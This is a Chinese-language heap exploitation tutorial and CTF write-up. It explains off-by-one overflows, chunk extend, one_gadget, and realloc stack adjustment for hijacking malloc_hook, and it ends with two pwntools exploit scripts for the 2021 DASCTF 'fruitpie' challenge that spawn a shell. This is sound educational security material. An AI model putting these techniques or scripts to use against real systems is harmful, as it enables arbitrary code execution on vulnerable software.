## off-by-one 漏洞

off-by-one 漏洞，原因是 for 循环的边界没有控制好导致写入多执行了一次，这也被称为栅栏错误

    
    
    栅栏错误：
    建造一条直栅栏（即不围圈），长 30 米、每条栅栏柱间相隔 3 米，需要多少条栅栏柱？
    最容易想到的答案 10 是错的。这个栅栏有 10 个间隔，11 条栅栏柱。
    
    
    int my_gets(char *ptr,int size)
    {
        int i;
        for(i=0;i<=size;i++)
        {
            ptr[i]=getchar();
        }
        return i;
    }
    int main()
    {
        void *chunk1,*chunk2;
        chunk1=malloc(16);
        chunk2=malloc(16);
        puts("Get Input:");
        my_gets(chunk1,16);
        return 0;
    }
    

`我们使用 gdb 对程序进行调试，在进行输入前可以看到分配的两个用户区域为 16 字节的堆块﻿`

    
    
    0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1
    0x602010:   0x0000000000000000  0x0000000000000000
    0x602020:   0x0000000000000000  0x0000000000000021 <=== chunk2
    0x602030:   0x0000000000000000  0x0000000000000000
    

当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块

    
    
    0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1
    0x602010:   0x4141414141414141  0x4141414141414141
    0x602020:   0x0000000000000041  0x0000000000000021 <=== chunk2
    0x602030:   0x0000000000000000  0x0000000000000000
    

第二种常见的原因是字符串的结束符计算有误

    
    
    int main(void)
    {
        char buffer[40]="";
        void *chunk1;
        chunk1=malloc(24);
        puts("Get Input");
        gets(buffer);
        if(strlen(buffer)==24)
        {
            strcpy(chunk1,buffer);
        }
        return 0;
    
    }
    

strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。 strlen 函数在计算字符串长度时是不把结束符 '\x00'
计算在内，但是 strcpy 在复制字符串时会拷贝结束符 '\x00' 。这就导致了我们向 chunk1 中写入了 25 个字节

    
    
    0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1
    0x602010:   0x0000000000000000  0x0000000000000000
    0x602020:   0x0000000000000000  0x0000000000000411 <=== next chunk
    

在我们输入'A'*24 后执行 strcpy

    
    
    0x602000:   0x0000000000000000  0x0000000000000021
    0x602010:   0x4141414141414141  0x4141414141414141
    0x602020:   0x4141414141414141  0x0000000000000400
    

可以看到 next chunk 的 size 低字节被结束符 '\x00' 覆盖

## chunk extend

chunk extend是一种限制比较少的堆利用方式，利用需要的条件是：可以进行堆布局，可以溢出至少一个字节

chunk extend的原理是，首先申请三个堆块：

![20191231215803903.png](https://image.3001.net/images/20210331/1617183572_606443540543a64cd0d12.png!small)

这里size 0x18是堆块的大小，1是前一个堆块占用位，先通过编辑堆块A然后通过off by one来溢出到堆块B的size域（覆盖结束符 '\x00'
），即可将其修改为0x18+0x18+1（其实就是size B+size C，然后前一个堆块占用1）：

![20191231215804702.png](https://image.3001.net/images/20210331/1617183584_6064436084ed4b256d290.png!small)

这时释放堆块B，由于大小在fastbins中，所以（堆块C的）下一个堆块的前一个堆块使用位不会被置0，再释放C，arena中对应的bins就会指向B和C，如图：

![20191231215818499.png](https://image.3001.net/images/20210331/1617183620_60644384bb27e3804e02e.png!small)

这时只要再申请一个0x40的大小的堆块，就可以将B+C这个“合成”堆块申请回来，然后就可以操作还在bins中的C堆块C了，将其指针为修改为想要任意写的地址，如free_got：

![20191231215824603.png](https://image.3001.net/images/20210331/1617183633_60644391a534586c6a7e5.png!small)

然后再申请一个大小为0x20的堆块，将C申请回来，这时bins就会指向freegot，接下来再申请空间就会申请到freegot了：

![20191231215851899.png](https://image.3001.net/images/20210331/1617183643_6064439b036917026898c.png!small)

再次申请一个0x20大小的堆块就会申请到free_got所在的地方，这时就可以修改为任意的值了，这个例子只是用来举例，其实利用方法非常灵活，只要将还在链表中的堆块成功包括在我们可控的堆块之内，有非常多的利用方式，无论是泄露地址或是任意地址写！这种利用方式是和fastbin
attack非常相似的，只不过适用于off by one这种溢出比较苛刻的地方。

one-gadget 是glibc里调用`execve('/bin/sh', NULL,
NULL)`的一段非常有用的gadget。在我们能控制程序执行流的时候，直接执行到onegadget的地址，并且满足onegadget的条件，便可直接getshell。如：

![Snipaste_2021-03-29_20-06-16.png](https://image.3001.net/images/20210331/1617183773_6064441db467970190a54.png!small)

这个libc.so.6中共有四个onegadget，相对应的条件分别是rsp+0x40、rsp+0x70

而有的时候我们有任意地址写的漏洞的时候，比如将malloc_hook写成onegadget，但无法满足onegadget的条件可以使用realloc来微调栈帧。

## realloc

realloc 在库函数中的作用是重新调整 malloc 或 calloc 所分配的堆大小。它和 malloc 函数一样有 hook 函数，当 hook
函数不为空时，就会跳转运行 hook 函数（和 malloc_hook 一样的）。函数一开始有很多的 push ，realloc 函数先执行 push
压栈，然后在跳转执行 realloc_hook 存储的函数。我们就是利用这些 push 调整栈帧。push 的数量发生变化会影响 rsp
的地址，这样就可以控制 rsp 的取值，从而满足 onegadget 的执行条件。。

## malloc_hook 与 realloc_hook

我们所利用的是将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget ，即：

malloc -> malloc_hook -> realloc -> realloc_hook -> onegadget

这样就能经过 realloc 调整栈帧后再运行 onegadget 。实际情况中，并不是直接劫持 malloc_hook 为 realloc
，而是要加上一定的偏移，也就是调整 push 的数量，让栈帧结构满足 onegadget 运行。

realloc 这个偏移，少一个 push ，rsp 就会向前移动一个内存单元，对应的 [rsp+0x30]=[rsp+0x38]
，但实际上有少部分位置可能被其他东西写入改变了原来的值：

    
    
    # 6个push
    pwndbg> x /20gx $rsp
    0x7fffffffdcb8: 0x00007ffff7a9195f 0x00007fffffffdd20
    0x7fffffffdcc8: 0x00005555555548e0 0x00007fffffffde40
    0x7fffffffdcd8: 0x0000000000000000 0x0000000000000000
    0x7fffffffdce8: 0x00007ffff7a43ea0 0x00007fffffffde40
    0x7fffffffdcf8: 0x0000000000000000 0x00007fffffffdd40
    0x7fffffffdd08: 0x00005555555548e0 0x00007fffffffde40
    0x7fffffffdd18: 0x0000000000000000 0x0000000000000000
    0x7fffffffdd28: 0x0000555555554b71 0x00005555555548e0
    0x7fffffffdd38: 0x0000001000000006 0x00007fffffffdd60
    0x7fffffffdd48: 0x0000555555554f86 0x00007fffffffde40
     
    # 5个push
    pwndbg> x /20gx $rsp
    0x7fffffffdcc0: 0x00007ffff7a9195f 0x00005555555548e0
    0x7fffffffdcd0: 0x00007fffffffde40 0x0000000000000000
    0x7fffffffdce0: 0x0000000000000000 0x00007ffff7a43ea0
    0x7fffffffdcf0: 0x00007fffffffde40 0x0000555555554a23
    0x7fffffffdd00: 0x0000000000000000 0x00007fffffffdd40
    0x7fffffffdd10: 0x00005555555548e0 0x00007fffffffde40
    0x7fffffffdd20: 0x0000000000000000 0x0000555555554b71
    0x7fffffffdd30: 0x00005555555548e0 0x0000001000000006
    0x7fffffffdd40: 0x00007fffffffdd60 0x0000555555554f86
    0x7fffffffdd50: 0x00007fffffffde40 0x0000000100000000
    

少一个 push ，rsp 就会向前移动一个内存单元，对应的 [rsp+0x30]=[rsp+0x38]

realloc函数的逻辑是先查看realloc_hook是否为null，不为null的话便调用realloc_hook。但不同的是realloc的汇编代码，在调用realloc_hook之前比malloc、free等多了好多push指令和sub抬栈操作：

![20191231220039911.png](https://image.3001.net/images/20210331/1617183682_606443c2bc1197c939758.png!small)

我们可以将realloc_hook改为onegadget，然后通过这些push和sub操作"微调"rsp寄存器，使其能够满足在调用realloc_hook（也就是onegadget）的时候满足相应的rsp条件。相应的利用方法就是由传统的直接修改malloc_hook变为先修改realloc_hook为onegadget之后，修改malloc_hook到特定的一个push处或sub处，然后调用malloc便相当于执行了满足条件的onegadget。

## 2021DASCTF_Mar_fruitpie

![Snipaste_2021-03-29_20-06-16.png](https://image.3001.net/images/20210331/1617183714_606443e296be36183acc3.png!small)

一个比较简单的realloc利用

![Snipaste_2021-03-29_20-19-36.png](https://image.3001.net/images/20210331/1617183725_606443eda124f28b18493.png!small)

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      _DWORD size[3]; // [rsp+4h] [rbp-1Ch] BYREF
      char *v5; // [rsp+10h] [rbp-10h]
      unsigned __int64 v6; // [rsp+18h] [rbp-8h]
    
      v6 = __readfsqword(0x28u);
      init(argc, argv, envp);
      welcome();
      puts("Enter the size to malloc:");
      size[0] = readInt();
      v5 = (char *)malloc(size[0]);
      if ( !v5 )
      {
        puts("Malloc Error");
        exit(0);
      }
      printf("%p\n", v5);//输出malloc指针的值
      puts("Offset:");
      _isoc99_scanf("%llx", &size[1]);//读取
      puts("Data:");
      read(0, &v5[*(_QWORD *)&size[1]], 0x10uLL);//读取0x10个字节
      malloc(0xA0uLL);
      close(1);
      return 0;
    }
    

首先计算出malloc_hook到堆地址的偏移，然后就是一个任意写0x10字节，下面还会再调用一次malloc，那么将one_gadget写到malloc_hook，配合realloc使用

exp：

    
    
    from pwn import *
    context.log_level='debug'
    context.arch='amd64'
    elf=ELF('./fruitpie')
    sh=process('./fruitpie')
    libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
    
    # pause()
    sh.sendafter("Enter the size to malloc:",str(99999999))#首先申请一个较大的chunk，这样得到的chunk地址就会落在libc附近
    
    sh.recvuntil("0x")
    addr=int(sh.recv(12),16)#接受返回的malloc地址
    log.success("addr:"+hex(addr))
    
    libc_base=addr+0x5f5eff0
    log.success("libc_base:"+hex(libc_base))
    
    malloc_hook=libc_base+libc.sym['__malloc_hook']
    one=libc_base+0x4f432
    realloc=libc_base+libc.sym['realloc']
    
    offset=0x634ac18
    
    # pause()
    sh.sendlineafter("Offset:",hex(offset)[2:])
    sh.sendafter("Data:",p64(one)+p64(realloc+4))
    sh.interactive()
    
    
    
    from pwn import *
    
    p = process("./fruitpie")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    context.log_level = "debug"
    
    # big chunk offset: 0x100000ff0
    
    p.recvuntil(b"Enter the size to malloc:\n")
    p.sendline(b"-1")
    mem_ptr = int(p.recvuntil(b"\n"), 16)
    libc_base = mem_ptr + 0x100000ff0
    
    malloc_hook = libc_base + libc.symbols[b"__malloc_hook"]
    realloc_hook = malloc_hook - 0x8
    
    realloc = libc_base + libc.symbols[b"realloc"]
    one_gadget = libc_base + 0x4f432#one_gadget
    print("mem_ptr:", hex(mem_ptr))
    print("malloc_hook:", hex(malloc_hook))
    
    p.recvuntil(b"Offset:\n")
    p.sendline(hex(realloc_hook-mem_ptr))
    p.recvuntil(b"Data:\n")
    p.send(p64(one_gadget) + p64(realloc+4))
    p.interactive()
    

参考链接：

> https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/
>
> https://blog.csdn.net/Breeze_CAT/article/details/103789081
>
> https://zhuanlan.zhihu.com/p/269126935
>
> https://eqqie.cn/index.php/binary/1622/#fruitpie
>
> https://r1nd0.github.io/2021/03/28/2021DASCTF-Mar-pwn-wp/#more

